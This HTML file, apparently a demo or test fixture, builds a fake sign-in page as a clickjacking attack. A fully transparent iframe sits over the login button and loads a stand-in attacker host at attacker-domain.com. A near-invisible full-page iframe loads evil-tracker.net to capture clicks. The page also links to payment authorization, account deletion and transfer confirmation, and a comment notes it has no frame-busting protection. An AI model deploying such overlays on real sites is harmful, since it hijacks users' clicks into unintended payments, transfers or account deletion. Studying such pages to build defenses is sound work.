<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Attack Page - Overlapping Elements</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .login-container {
            position: relative;
            width: 400px;
            margin: 50px auto;
            padding: 20px;
            border: 1px solid #ccc;
            background: #f9f9f9;
        }
        .login-btn {
            position: absolute;
            top: 150px;
            left: 50px;
            width: 200px;
            height: 40px;
        }
        .submit-btn {
            position: absolute;
            top: 200px;
            left: 50px;
            width: 150px;
            height: 35px;
        }
        /* Malicious transparent overlay */
        .evil-iframe {
            position: absolute;
            top: 140px;
            left: 40px;
            width: 220px;
            height: 60px;
            opacity: 0.0;
            z-index: 10000;
            border: none;
        }
        .evil-iframe-2 {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.05;
            z-index: 9998;
        }
    </style>
</head>
<body>
    <h1>Fake Login Page</h1>

    <div class="login-container">
        <h2>Sign In</h2>
        <form>
            <div>
                <label>Email:</label>
                <input type="email" name="email" style="width: 100%;">
            </div>
            <div>
                <label>Password:</label>
                <input type="password" name="password" style="width: 100%;">
            </div>

            <!-- Target login button -->
            <button class="login-btn" type="submit" id="login">
                Sign In
            </button>

            <!-- Another target: payment submission -->
            <button class="submit-btn" type="button" id="pay-now">
                Pay Now - $99
            </button>
        </form>

        <!-- Transparent iframe directly over login button -->
        <iframe
            class="evil-iframe"
            src="https://attacker-domain.com/steal-click?target=login"
            scrolling="no">
        </iframe>

        <a href="/authorize-payment" id="authorize">Authorize Payment</a>
        <a href="/delete-account" id="delete">Delete Account</a>
        <a href="/confirm-transfer" id="transfer">Confirm Transfer</a>
    </div>

    <!-- Full-page transparent overlay -->
    <iframe
        class="evil-iframe-2"
        src="https://evil-tracker.net/capture-all-clicks"
        frameborder="0">
    </iframe>

    <script>
        // No frame-busting protection on this page
    </script>
</body>
</html>
